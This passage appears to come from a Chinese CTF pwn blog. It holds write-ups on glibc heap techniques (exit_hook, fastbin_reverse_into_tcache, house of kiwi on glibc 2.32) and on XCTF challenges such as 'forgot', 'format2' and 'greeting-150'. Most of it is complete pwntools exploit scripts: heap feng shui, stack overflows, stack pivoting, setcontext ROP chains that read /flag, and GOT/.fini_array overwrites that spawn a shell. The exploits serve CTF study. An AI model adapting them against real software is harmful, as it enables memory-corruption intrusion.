[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(idx, content):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;How many pages your notebook will be? :&#x27;)r.sendline(bytes(str(0x40040000), encoding=&#x27;utf-8&#x27;))show(0x8339a)r.recvuntil(b&#x27;Content: &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x218cc0print(hex(libc_base))for i in range(9):    create(i, b&#x27;\\n&#x27;)for i in range(8):    delete(i)delete(8)delete(7)show(0)r.recvuntil(b&#x27;Content: &#x27;)key = u64(r.recv(5).ljust(8, b&#x27;\\x00&#x27;))print(hex(key))for i in range(7):    create(i, b&#x27;\\n&#x27;)one_gadget = libc_base + 0xeeccclibc_atexit = libc_base + 0x21a6c8 - 8create(7, p64(libc_atexit ^ key))create(8, b&#x27;\\n&#x27;)create(8, b&#x27;\\n&#x27;)create(9, p64(0) + p64(one_gadget))r.recvuntil(b&#x27;4. Exit&#x27;)gdb.attach(    r,    &#x27;b*$rebase(0x169A)\\nb _int_malloc\\ndir /ctf/work/download/glibc-2.34/malloc&#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n总结这里从源码层面解释了两种exit_hook，并且在例题中两种方式都是使用了，国赛的这道题目是很简单的，我也想到第一种方法了，不过就是因为存在知识点的遗漏导致没做出来，也是在看了wp之后才了解了exit_hook，所以基础知识还是很重要不然思路会受到限制。第一道例题如果有需要可以评论。\n","categories":["pwn"],"tags":["堆利用"]},{"title":"fastbin_reverse_into_tcache","url":"/2022/05/26/fastbin-reverse-into-tcache/","content":"这一利用方式是一种类似于unsorted bin，tcache stashing unlink attack可以在任意地址写入堆地址的漏洞。\n源码分析if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))&#123;    idx = fastbin_index (nb);    mfastbinptr *fb = &amp;fastbin (av, idx);    mchunkptr pp;    victim = *fb;    if (victim != NULL)    &#123;        if (SINGLE_THREAD_P)            *fb = victim-&gt;fd;        else            REMOVE_FB (fb, pp, victim);        if (__glibc_likely (victim != NULL))        &#123;            size_t victim_idx = fastbin_index (chunksize (victim));            if (__builtin_expect (victim_idx != idx, 0))                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);            check_remalloced_chunk (av, victim, nb);            #if USE_TCACHE            /* While we&#x27;re here, if we see other chunks of the same size,\t\t stash them in the tcache.  */            size_t tc_idx = csize2tidx (nb);            if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)            &#123;                mchunkptr tc_victim;                /* While bin not empty and tcache not full, copy chunks.  */                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                       &amp;&amp; (tc_victim = *fb) != NULL)                &#123;                    if (SINGLE_THREAD_P)                        *fb = tc_victim-&gt;fd;                    else                    &#123;                        REMOVE_FB (fb, pp, tc_victim);                        if (__glibc_unlikely (tc_victim == NULL))                            break;                    &#125;                    tcache_put (tc_victim, tc_idx);                &#125;            &#125;            #endif            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;        &#125;    &#125;&#125;\n\n可以看到在源码中，如果tcache不为空，那么就会从fastbin的fd指针指向的chunk开始往tcache内放入chunk。如果我们能够将最后一个堆地址的fd指针改成我们的目标地址即可实现任意地址写了。\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\n这里的写功能还是在放入tcache的函数内完成的，可以看到其实是写了两个指针的。\n\n\n\n最后实现这样\npoc这里的poc是how2heap当中的\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;const size_t allocsize = 0x40;int main()&#123;  setbuf(stdout, NULL);  printf(    &quot;\\n&quot;    &quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\\n&quot;    &quot;except it works with a small allocation size (allocsize &lt;= 0x78).\\n&quot;    &quot;The goal is to set things up so that a call to malloc(allocsize) will write\\n&quot;    &quot;a large unsigned value to the stack.\\n\\n&quot;  );  // Allocate 14 times so that we can free later.  char* ptrs[14];  size_t i;  for (i = 0; i &lt; 14; i++) &#123;    ptrs[i] = malloc(allocsize);  &#125;  printf(    &quot;First we need to free(allocsize) at least 7 times to fill the tcache.\\n&quot;    &quot;(More than 7 times works fine too.)\\n\\n&quot;  );  // Fill the tcache.  for (i = 0; i &lt; 7; i++) &#123;    free(ptrs[i]);  &#125;  char* victim = ptrs[7];  printf(    &quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\\n&quot;    &quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\\n&quot;    &quot;already full, it will go in the fastbin.\\n\\n&quot;,    victim  );  free(victim);  printf(    &quot;Next we need to free between 1 and 6 more pointers. These will also go\\n&quot;    &quot;in the fastbin. If the stack address that we want to overwrite is not zero\\n&quot;    &quot;then we need to free exactly 6 more pointers, otherwise the attack will\\n&quot;    &quot;cause a segmentation fault. But if the value on the stack is zero then\\n&quot;    &quot;a single free is sufficient.\\n\\n&quot;  );  // Fill the fastbin.  for (i = 8; i &lt; 14; i++) &#123;    free(ptrs[i]);  &#125;  // Create an array on the stack and initialize it with garbage.  size_t stack_var[6];  memset(stack_var, 0xcd, sizeof(stack_var));  printf(    &quot;The stack address that we intend to target: %p\\n&quot;    &quot;It&#x27;s current value is %p\\n&quot;,    &amp;stack_var[2],    (char*)stack_var[2]  );  printf(    &quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\\n&quot;    &quot;to overwrite the next pointer at address %p\\n\\n&quot;,    victim  );  //------------VULNERABILITY-----------  // Overwrite linked list pointer in victim.  *(size_t**)victim = &amp;stack_var[0];  //------------------------------------  printf(    &quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\\n\\n&quot;  );  // Empty tcache.  for (i = 0; i &lt; 7; i++) &#123;    ptrs[i] = malloc(allocsize);  &#125;  printf(    &quot;Let&#x27;s just print the contents of our array on the stack now,\\n&quot;    &quot;to show that it hasn&#x27;t been modified yet.\\n\\n&quot;  );  for (i = 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  printf(    &quot;\\n&quot;    &quot;The next allocation triggers the stack to be overwritten. The tcache\\n&quot;    &quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\\n&quot;    &quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\\n&quot;    &quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\\n&quot;    &quot;address that we are targeting ends up being the first chunk in the tcache.\\n&quot;    &quot;It contains a pointer to the next chunk in the list, which is why a heap\\n&quot;    &quot;pointer is written to the stack.\\n&quot;    &quot;\\n&quot;    &quot;Earlier we said that the attack will also work if we free fewer than 6\\n&quot;    &quot;extra pointers to the fastbin, but only if the value on the stack is zero.\\n&quot;    &quot;That&#x27;s because the value on the stack is treated as a next pointer in the\\n&quot;    &quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\\n&quot;    &quot;\\n&quot;    &quot;The contents of our array on the stack now look like this:\\n\\n&quot;  );  malloc(allocsize);  for (i = 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  char *q = malloc(allocsize);  printf(    &quot;\\n&quot;    &quot;Finally, if we malloc one more time then we get the stack address back: %p\\n&quot;,    q  );  assert(q == (char *)&amp;stack_var[2]);  return 0;&#125;\n\n并且在上面poc也说了，如果我们再一次malloc即可获得我们目标地址的chunk，也就是可以进行任意地址分配chunk。\n\n参考链接：https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c\n","categories":["pwn"],"tags":["堆利用"]},{"title":"forgot","url":"/2021/10/18/forgot/","content":"检查程序\n32位，只开了栈不可执行的保护。\n反汇编int __cdecl main()&#123;  size_t v0; // ebx  char v2[32]; // [esp+10h] [ebp-74h] BYREF  _DWORD v3[10]; // [esp+30h] [ebp-54h]  char s[32]; // [esp+58h] [ebp-2Ch] BYREF  int v5; // [esp+78h] [ebp-Ch]  size_t i; // [esp+7Ch] [ebp-8h]  v5 = 1;  v3[0] = sub_8048604;  v3[1] = sub_8048618;  v3[2] = sub_804862C;  v3[3] = sub_8048640;  v3[4] = sub_8048654;  v3[5] = sub_8048668;  v3[6] = sub_804867C;  v3[7] = sub_8048690;  v3[8] = sub_80486A4;  v3[9] = sub_80486B8;  puts(&quot;What is your name?&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  fgets(s, 0x20, stdin);  sub_80485DD(s);  fflush(stdout);  printf(&quot;I should give you a pointer perhaps. Here: %x\\n\\n&quot;, sub_8048654);  fflush(stdout);  puts(&quot;Enter the string to be validate&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  __isoc99_scanf(&quot;%s&quot;, v2);  for ( i = 0; ; ++i )  &#123;    v0 = i;    if ( v0 &gt;= strlen(v2) )      break;    switch ( v5 )    &#123;      case 1:        if ( sub_8048702(v2[i]) )          v5 = 2;        break;      case 2:        if ( v2[i] == 64 )          v5 = 3;        break;      case 3:        if ( sub_804874C(v2[i]) )          v5 = 4;        break;      case 4:        if ( v2[i] == 46 )          v5 = 5;        break;      case 5:        if ( sub_8048784(v2[i]) )          v5 = 6;        break;      case 6:        if ( sub_8048784(v2[i]) )          v5 = 7;        break;      case 7:        if ( sub_8048784(v2[i]) )          v5 = 8;        break;      case 8:        if ( sub_8048784(v2[i]) )          v5 = 9;        break;      case 9:        v5 = 10;        break;      default:        continue;    &#125;  &#125;  (v3[--v5])();  return fflush(stdout);&#125;\n\n内部的其他函数基本就是这样一个判断\n_BOOL4 __cdecl sub_8048702(char a1)&#123;  return a1 &gt; 96 &amp;&amp; a1 &lt;= 122 || a1 &gt; 47 &amp;&amp; a1 &lt;= 57 || a1 == 95 || a1 == 45 || a1 == 43 || a1 == 46;&#125;\n\n还有一个已经被我改名字的函数可以直接拿到flag\nint get_flag()&#123;  char s[58]; // [esp+1Eh] [ebp-3Ah] BYREF  snprintf(s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);  return system(s);&#125;\n\n代码审计程序存在两处栈溢出\nfgets(s, 0x20, stdin);  // 第一处sub_80485DD(s);fflush(stdout);printf(&quot;I should give you a pointer perhaps. Here: %x\\n\\n&quot;, sub_8048654);fflush(stdout);puts(&quot;Enter the string to be validate&quot;);printf(&quot;&gt; &quot;);fflush(stdout);__isoc99_scanf(&quot;%s&quot;, v2);  // 第二处\n\n看完代码逻辑，第一处没什么用，整个程序的意思也就是，输入一串字符，然后在遍历字符，如果字符满足就改变v5但是最终程序执行\n(v3[--v5])();这个，思路很明确，让v3[0]=get_flag_addr然后让v5=1，v5本来就等于所以只需要都return false就行\nexpfrom pwn import *\n\ncontext(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)\n\nelf = ELF(&#39;./questions/d033ab68b3e64913a1b6b1029ef3dc29&#39;)\nr = remote(&#39;111.200.241.244&#39;, 56210)\n\nflag_addr = 0x80486cc\npayload = b&#39;A&#39;*(0x20)+p32(flag_addr)\nr.recvuntil(b&#39;What is your name?\\n&#39;)\nr.sendlineafter(b&#39;&gt;&#39;, &#39;1&#39;)\nr.sendlineafter(b&#39;Enter the string to be validate&#39;, payload)\n\nr.interactive()\n\n","categories":["pwn-xctf"],"tags":["stack-overflow"]},{"title":"format2","url":"/2021/12/02/format2/","content":"检查保护\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+4h] [ebp-3Ch]  int v5; // [esp+18h] [ebp-28h] BYREF  char s[30]; // [esp+1Eh] [ebp-22h] BYREF  unsigned int v7; // [esp+3Ch] [ebp-4h]  memset(s, 0, sizeof(s));  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;, v4);  _isoc99_scanf(&quot;%30s&quot;, s);  memset(&amp;input, 0, 0xCu);  v5 = 0;  v7 = Base64Decode(s, &amp;v5);  if ( v7 &gt; 0xC )  &#123;    puts(&quot;Wrong Length&quot;);  &#125;  else  &#123;    memcpy(&amp;input, v5, v7);    if ( auth(v7) == 1 )      correct();  &#125;  return 0;&#125;\n\n_BOOL4 __cdecl auth(int a1)&#123;  char v2[8]; // [esp+14h] [ebp-14h] BYREF  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h] BYREF  memcpy(&amp;v4, &amp;input, a1);  s2 = (char *)calc_md5(v2, 12);  printf(&quot;hash : %s\\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;&#125;\n\nvoid __noreturn correct()&#123;  if ( input == -559038737 )  &#123;    puts(&quot;Congratulation! you are good!&quot;);    system(&quot;/bin/sh&quot;);  &#125;  exit(0);&#125;\n\n流程分析流程很简单，就是你输入30个字符然后base64decode一下，要是长度小于等于12个字符就可以进行验证，验证通过再检查input是不是和这个-559038737相等就可。但是作为pwn题应该不会让你去像web那样搞这个md5，这道题的漏洞发生在auth里面的复制这个v4会造成栈溢出\n利用分析但是受限于题目输入字符的限制我们只能输入12个有效字符，也就是刚刚覆盖到ebp那个位置就没法继续往后覆盖了。但是这个input是一个全局变量所以考虑栈迁移。直接贴exp了，理解起来很简单\nfrom pwn import *import base64elf = ELF(&#x27;./format2&#x27;)# r = process(&#x27;./format2&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 51941)shell_addr = 0x08049284input_addr = 0x0811EB40r.recvuntil(b&#x27;Authenticate : &#x27;)payload = b&#x27;a&#x27;*0x4 + p32(shell_addr) + p32(input_addr)payload = base64.b64encode(payload)r.sendline(payload)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["栈迁移"]},{"title":"glibc2.32的堆风水+house of kiwi实例","url":"/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/","content":"看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，如果存在差异就会写文章记录。\n在学校的一次比赛当中我出了一道题，是glibc2.23版本的，当时的解题关键就是off by null进行多个堆合并，利用方式较为简单。但是就目前的glibc2.32中consolidate的条件是比较苛刻的，因此出现了新的堆风水的方式了(这篇文章也是把以前的坑填了)。\n隔块堆合并手法首先还是先看源码\nif (!prev_inuse(p)) &#123;    prevsize = prev_size (p);    size += prevsize;    p = chunk_at_offset(p, -((long) prevsize));    if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);    unlink_chunk (av, p);&#125;\n\nstatic voidunlink_chunk (mstate av, mchunkptr p)&#123;  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  mchunkptr fd = p-&gt;fd;  mchunkptr bk = p-&gt;bk;  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);  fd-&gt;bk = bk;  bk-&gt;fd = fd;  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)    &#123;      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p\t  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)\tmalloc_printerr (&quot;corrupted double-linked list (not small)&quot;);      if (fd-&gt;fd_nextsize == NULL)\t&#123;\t  if (p-&gt;fd_nextsize == p)\t    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;\t  else\t    &#123;\t      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;\t      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;\t      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;\t      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;\t    &#125;\t&#125;      else\t&#123;\t  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;\t  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;\t&#125;    &#125;&#125;\n\n可以看到这里是验证了p位，如果为0那么就检测前一个chunk的size是否等于当前chunk的size，那么就不能单纯的像以前那样利用了，我们还需要伪造前一个chunk的size了，这里需要用到large bin的机制了。\n利用方式既然我们只能进行off by null还需要堆合并，那我们就需要满足上面代码的两项要求，第一就是常规的chunk-&gt;fd-&gt;bk指向本身，其次就是size==prev_size\n\n此时取出size:0x510，由于残留指针，所以还是存在以下的指向关系\n\n并且此时在fd，bk位置伪造prev_size和size，那么我们在下面off by null的时候计算出prev_size即可绕过对于size的检查了。但是此时又出现了一个问题，fake_chunk的fd的bk以及fake_chunk的bk的fd并不指向它本身。那么现在取出size:0x500的chunk，直接覆盖掉其fd指针，使他指向size:0x510，然后large bin当中只剩下一个size:0x520，它的fd和bk都指向了large bin了，所以我们此时需要再free一个size为0x500的chunk，然后把size:0x520取出来进行覆盖，那么即可绕过consolidate时的验证了。\nNULL_FXCK基本流程这道题同样是菜单题，但是不同的是在每次选择的时候会验证__malloc_hook和__free_hook以及会清除掉tcache的count。\n然后唯一的漏洞点是modify函数，存在一个off by null但是只能执行一次。并且在delete函数会清空指针。\n思路因为只有一次off by null的机会，所以我们能够利用的方式就是上面的堆合并技巧，但是这里的create函数在写入数据的时候总是会把结尾改为\\x00并且最小的chunk为0x110所以我们无法直接覆盖内容了，需要利用partial overwrite并且这里的partial overwrite还需要注意一下。我们需要让size:0x510的chunk的地址形式为：0xAAAAAAAAAAAA00AA\n\n形成这样的堆叠，接着申请回来并覆盖值\n\n当然这里由于partial overwrite的缘故第一位是否为0是需要一定概率的(上面的0x1000是因为我还没有计算大小，后续会调整)。\n\n可以看到这里就实现了consolidate。\n下面就是泄漏地址了，首先先泄漏堆地址，因为泄漏起来较为简单，在我们consolidate之前我们所显示的堆地址都是以\\x00结尾导致无法泄漏，但是在consolidate之后存在以下代码\nunlink_chunk (mstate av, mchunkptr p)&#123;  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  mchunkptr fd = p-&gt;fd;  mchunkptr bk = p-&gt;bk;  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);  fd-&gt;bk = bk;  bk-&gt;fd = fd;  ... ...\n\n导致堆地址写在了其他索引的chunk当中，所以可以非常轻松的泄漏出来，不过这里的main_arena+96非常恶心，结尾是\\x00有因为是strlen计算大小打印就导致泄漏不出来，但是这里使用的方法可以继续延续在unsorted bin当中的思路进行切割，但是下一步就是申请大chunk将我们consolidate的chunk放到largin bin当中。\n后面也就是实现任意地址写了，首先想到的肯定就是tcache，虽然题目看起来是没有办法对tcache进行攻击的但是tcache这个结构体也只是因为tls结构存放的指针才起的作用，所以我们可以通过large bin attack来修改tls结构当中的指针，然后在堆块中布置好地址，最后修改地址进行fsop。这里采取的方式就是以前写过的house of kiwi不过以前写的比较匆忙也没有加以实践，可能看起来就会晕头晕脑的，所以这里还是从源码层面分析一边接着放出exp应该会好点。\nhouse of kiwi先来说一下为什么不能用house of系列中的其他方式，因为这道题的退出函数是_exit然而其他的要求是exit退出或者正常main退出，所以这里只能寻找其他攻击链。\nstatic void__malloc_assert (const char *assertion, const char *file, unsigned int line,\t\t const char *function)&#123;  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;,\t\t     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,\t\t     file, line,\t\t     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,\t\t     assertion);  fflush (stderr);  abort ();&#125;\n\n当assert触发时会调用这一函数，中间调用了fflush\nint_IO_fflush (FILE *fp)&#123;  if (fp == NULL)    return _IO_flush_all ();  else    &#123;      int result;      CHECK_FILE (fp, EOF);      _IO_acquire_lock (fp);      result = _IO_SYNC (fp) ? EOF : 0;      _IO_release_lock (fp);      return result;    &#125;&#125;\n\n\n通过调试也可以看到调用关系\n\n并且这里是可读可写的，所以后续就好办了。\nexpfrom pwn import *elf = ELF(&#x27;./main&#x27;)libc = ELF(&#x27;./libc-2.32.so&#x27;)# context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, content=None):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;(: Size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content:&#x27;)    if content is None:        r.send(b&#x27;\\n&#x27;)    else:        r.send(content)def edit(idx, content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content:&#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))while 1:    r = process(&#x27;./main&#x27;)    try:        # r = process(&#x27;./main&#x27;)        create(0x2000)        create(0x2000)        create(0xd20)        create(0x500)  #3        create(0x4f0)  #4        create(0x4f0)        create(0x100)        create(0x510)        create(0x100)        create(0x500)        create(0x108)  #10        create(0x4f0)        create(0x100)        delete(7)        create(0x1000)        delete(7)        delete(5)        create(0x1000)        delete(5)        delete(3)        create(0x1000)        delete(3)        create(0x500, flat(0, 0x1c60 + 1))  #3        create(0x4f0, b&#x27;\\x00&#x27; * 8 + b&#x27;\\x10\\n&#x27;)  #5        delete(4)        create(0x1000)        delete(4)        create(0x510, b&#x27;\\x10\\n&#x27;)  #4        create(0x4f0)  #7---4        edit(10, b&#x27;\\x00&#x27; * 0x100 + p64(0x1c60))        delete(11)        show(4)        context.log_level = &#x27;debug&#x27;        heap_base = u64(            r.recvuntil(b&#x27;1. Create&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x5a10        print(hex(heap_base))        create(0x4f0)  #11        create(0x2000)  #13        delete(13)        show(7)        libc_base = u64(            r.recvuntil(b&#x27;1. Create&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x1e4280        print(hex(libc_base))        tls_tcache = libc_base + 0x1eb578        _IO_file_jumps_addr = libc_base + 0x1e54c0        _IO_file_jumps_SYNC_addr = _IO_file_jumps_addr + 0x60        fake_tcache = b&#x27;\\x00&#x27; * (0x7C - 0x10)        fake_tcache += p16(1)        fake_tcache += p16(1)        fake_tcache = fake_tcache.ljust(0x270 - 0x10, b&#x27;\\x00&#x27;)        fake_tcache += p64(_IO_file_jumps_SYNC_addr)        fake_tcache += p64(libc_base + 0x1e48c0)        payload = fake_tcache        create(0x4f0, payload)  #13        delete(4)        create(0x2000)        delete(4)        payload = b&#x27;a&#x27; * 0x600 + flat(0, 0x521, libc_base + 0x1e4030, libc_base                                      + 0x1e4030, 0, tls_tcache - 0x20)        create(0x600 + 0x30, payload)        delete(7)        create(0x2000)        delete(7)        create(0x4f0, fake_tcache)        pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))        pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))        pop_rdx = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))        pop_rax = libc_base + next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))        syscall = libc_base + next(libc.search(asm(&#x27;syscall\\nret&#x27;)))        ret = libc_base + next(libc.search(asm(&#x27;ret&#x27;)))        heap_addr = heap_base + 0x7298        payload = b&#x27;/flag\\x00\\x00\\x00&#x27;        payload += flat(pop_rdi, heap_addr - 0x8, pop_rsi, 0, pop_rdx, 0,                        pop_rax, 2, syscall)        payload += flat(pop_rdi, 3, pop_rsi, libc_base + libc.bss(), pop_rdx,                        0x100, pop_rax, 0, syscall)        payload += flat(pop_rdi, 1, pop_rsi, libc_base + libc.bss(), pop_rdx,                        0x100, pop_rax, 1, syscall)        create(0x1200, payload)        create(0x590, fake_tcache[48:])        payload = b&#x27;\\x00&#x27; * 0xa0 + p64(heap_addr) + p64(ret)        create(0x400, payload)        create(0x3f0, p64(libc.symbols[&#x27;setcontext&#x27;] + 61 + libc_base))        delete(15)        # delete(9)        create(            0xb40, b&#x27;\\x00&#x27; * 0xb08 +            flat(0x521 | 4, libc_base + 0x1e4030, libc_base + 0x1e4030,                 heap_base + 0x6020, heap_base + 0x6020))        create(0x610, b&#x27;\\x00&#x27; * 0x608 + p64(0x500 | 4))        create(0x510)        r.recvuntil(b&#x27;&gt;&gt; &#x27;)        r.sendline(b&#x27;1&#x27;)        r.recvuntil(b&#x27;(: Size:&#x27;)        r.sendline(bytes(str(0x2000), encoding=&#x27;utf-8&#x27;))        # gdb.attach(r)        # pause()        context.log_level = &#x27;debug&#x27;    except:        r.close()r.interactive()\n\n在前面chunk布局的时候最好多放点chunk，不然就跟我一样后续加很麻烦。\n\n参考文章：\nhttps://www.anquanke.com/post/id/235598\n","categories":["pwn"],"tags":["HeapFengShui","house of 系列"]},{"title":"greeting-150","url":"/2021/10/21/greeting-150/","content":"检查保护\n三十二位，开启了Canary\n\n执行结果是这样，猜测可能有格式化字符串\n执行流程分析int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[64]; // [esp+1Ch] [ebp-84h] BYREF  char v5[64]; // [esp+5Ch] [ebp-44h] BYREF  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(v5, 64) )    return puts(&quot;Don&#x27;t ignore me ;( &quot;);  sprintf(s, &quot;Nice to meet you, %s :)\\n&quot;, v5);  return printf(s);&#125;\n\n这个getnline是真的长得像libc自带的\nsize_t __cdecl getnline(char *s, int n)&#123;  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);&#125;\n\n整体流程就是输入一段字符，然后把字符复制给s然后打印出s，s那里存在明显的格式化字符串漏洞，输入aaaaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p\n\n上面是栈内的情况    \n\n打印的结果，可以看到偏移量是12。而且在getnline函数里面的strlen的调用方式和system一模一样，所以篡改strlen的got表地址到system就可以直接执行了。但是目前还有一个问题就是程序是只存在一处漏洞，并且执行完了就没了，然后思路就断了，看了wp知道：\nmain在执行之前会调用.init段的代码和.init_array段的函数数组的每一个指针，在main执行结束后会调用，.fini段代码和.fini_array段的函数数组的每一个指针\n函数利用过程首先修改strlen的got表为system的plt表，那么调用strlen的时候就是就调用了system，然后修改.fini_array的段指针到main函数，然后就等main执行完之后就会重新进入main在调用getnline的时候输入/bin/sh就可以调用到system(‘/bin/sh’)了，就getshell了。\n.fini_array:08049934 ; ELF Termination Function Table.fini_array:08049934 ; ===========================================================================.fini_array:08049934.fini_array:08049934 ; Segment type: Pure data.fini_array:08049934 ; Segment permissions: Read/Write.fini_array:08049934 _fini_array     segment dword public &#x27;DATA&#x27; use32.fini_array:08049934                 assume cs:_fini_array.fini_array:08049934                 ;org 8049934h.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o.fini_array:08049934 _fini_array     ends                    ; Alternative name is &#x27;__init_array_end&#x27;.fini_array:08049934\n\n上面调用的是 __do_global_dtors_aux函数\n.text:080485A0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o.text:080485A0                 cmp     ds:completed_6591, 0.text:080485A7                 jnz     short locret_80485BC.text:080485A9                 push    ebp.text:080485AA                 mov     ebp, esp.text:080485AC                 sub     esp, 8.text:080485AF                 call    deregister_tm_clones.text:080485B4                 mov     ds:completed_6591, 1.text:080485BB                 leave.text:080485BC.text:080485BC locret_80485BC:                         ; CODE XREF: __do_global_dtors_aux+7↑j.text:080485BC                 rep 